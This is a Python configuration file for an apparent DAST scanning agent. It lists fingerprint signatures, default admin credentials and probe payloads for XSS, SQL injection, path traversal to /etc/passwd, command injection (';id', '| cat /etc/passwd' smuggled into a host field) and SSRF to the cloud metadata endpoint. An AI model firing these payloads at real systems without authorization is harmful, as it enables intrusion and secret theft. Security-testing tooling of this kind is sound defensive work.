"""
Configuration and constants for DAST Agents and Attack Surface Indexing.
"""

# ── Attack Surface Indexing Signatures ──

TECH_SIGNATURES = {
    "express": [r"X-Powered-By: Express", r"Cannot GET"],
    "django": [r"csrfmiddlewaretoken", r"Django"],
    "rails": [r"X-Powered-By: Phusion", r"authenticity_token"],
    "laravel": [r"laravel_session", r"XSRF-TOKEN"],
    "spring": [r"X-Application-Context", r"whitelabel error"],
}

SQL_ERROR_SIGS = [
    r"sql syntax", r"ORA-\d{5}", r"PSQLException",
    r"sqlite3?\.OperationalError", r"mysql_fetch",
]

FILE_PARAM_KEYWORDS = ["file", "path", "dir", "doc", "url", "filename", "name", "filepath"]
FORMAT_PARAM_KEYWORDS = ["format", "export"]
URL_PARAM_KEYWORDS = ["url", "callback", "callbackurl", "webhook", "target", "redirect"]
DEBUG_ROUTE_KEYWORDS = ["debug", "admin", "info", "env", "config", "status"]

# ── Authentication / Authorization ──

AUTH_KEYWORDS = ["/admin", "/user", "/profile", "/dashboard", "/api/private"]
DEFAULT_CREDS = [("admin", "admin"), ("admin", "admin123")]

# ── Vulnerability Payloads & Probes ──

XSS_PAYLOADS = [
    "<script>alert(1)</script>", 
    "<img src=x onerror=alert(1)>"
]

SQLI_PAYLOADS = [
    "' OR '1'='1", 
    "' UNION SELECT NULL--"
]

SQL_ERRORS_BASIC = [
    "sql", "syntax error", "sqlite", "mysql", "postgres"
]

LFI_TARGETS = [
    "/download?file=../../../etc/passwd", 
    "/api/file?path=../../../etc/passwd"
]
LFI_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd"
]

CMDI_TARGETS = [
    "/api/ping?host=127.0.0.1;id", 
    "/ping?host=127.0.0.1|whoami"
]
CMDI_INJECT_PAYLOADS = [
    ";id", "|whoami", "$(id)", "`id`"
]
CMDI_API_TESTS = [
    ("POST", "/api/ping", {"host": "127.0.0.1; id"}),
    ("POST", "/api/ping", {"host": "127.0.0.1 && whoami"}),
    ("POST", "/api/ping", {"host": "127.0.0.1 | cat /etc/passwd"}),
    ("POST", "/api/exec", {"cmd": "id"}),
]

IDOR_PATHS = [
    "/api/employees/", "/api/payroll/", "/api/users/", "/api/payslips/", "/api/orders/"
]

SSRF_ENDPOINTS = [
    ("/api/fetch", {"url": "http://127.0.0.1"}),
    ("/api/fetch", {"url": "http://169.254.169.254/latest/meta-data/"}),
    ("/api/proxy", {"url": "http://127.0.0.1"}),
]
SSRF_GET_ENDPOINTS = [
    "/api/fetch?url=http://127.0.0.1",
    "/api/fetch?url=http://169.254.169.254/latest/meta-data/",
]
SSRF_INTERNAL_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1"
]

SDE_PATHS = [
    "/api/debug", "/api/env", "/api/config", "/debug", "/env", "/api/health"
]
SDE_INDICATORS = [
    "DB_", "SECRET", "KEY", "PASSWORD", "TOKEN", "process.env", "DATABASE_URL", "MONGO", "REDIS"
]
